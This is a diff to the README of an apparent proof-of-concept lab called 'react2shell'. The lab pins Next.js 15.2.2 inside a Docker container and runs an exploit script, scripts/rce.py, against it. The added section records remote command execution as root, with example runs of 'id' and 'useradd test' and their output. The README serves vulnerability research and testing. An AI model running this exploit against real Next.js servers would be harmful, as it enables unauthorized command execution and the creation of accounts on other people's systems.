@@ -25,8 +25,8 @@
 
 ```sh
 # scaffold Next.js app into app/, then pin the vulnerable version
-npx create-next-app@latest app/react2shell --js --app --src-dir --no-tailwind --no-eslint
-cd app/react2shell
+npx create-next-app@latest app --js --app --src-dir --no-tailwind --no-eslint
+cd app
 npm install next@15.2.2
 
 # run app
@@ -45,3 +45,40 @@ python poc.py http://localhost:3000 calc
 ---
 
 ## Dockerize
+
+The container runs `next dev`, which is required for the exploit to work.
+
+```sh
+cd app
+
+# build the image
+docker build -f Dockerfile.vuln -t react2shell:vuln .
+
+# run
+docker run --rm -d --name react2shell -p 3000:3000 react2shell:vuln
+
+# Exploit vulnerability
+python scripts/rce.py http://localhost:3000 id
+# status code: 500
+# response text:
+# 0:{"a":"$@1","f":"","b":"development"}
+# 1:E{"digest":"uid=0(root) gid=0(root) groups=0(root)","name":"Error","message":"NEXT_REDIRECT","stack":[],"env":"Server"}
+
+python scripts/rce.py http://localhost:3000 "useradd test"
+# status code: 500
+# response text:
+# 0:{"a":"$@1","f":"","b":"development"}
+# 1:E{"digest":"3289825471","name":"Error","message":"NEXT_REDIRECT","stack":[],"env":"Server"}
+
+# executable response:
+# 3289825471
+
+python scripts/rce.py http://localhost:3000 "id test"
+# status code: 500
+# response text:
+# 0:{"a":"$@1","f":"","b":"development"}
+# 1:E{"digest":"uid=1005(test) gid=1005(test) groups=1005(test)","name":"Error","message":"NEXT_REDIRECT","stack":[],"env":"Server"}
+
+# executable response:
+# uid=1005(test) gid=1005(test) groups=1005(test)
+```
